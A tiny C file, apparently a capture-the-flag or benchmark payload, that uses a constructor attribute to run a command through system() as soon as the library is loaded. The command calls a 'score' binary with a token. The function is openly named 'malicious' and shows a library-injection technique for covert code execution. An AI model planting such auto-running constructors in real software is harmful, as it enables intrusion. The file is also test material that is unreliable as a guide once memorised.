#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 86d79435-4bb3-4fb9-8960-f7762b6173cd");
}
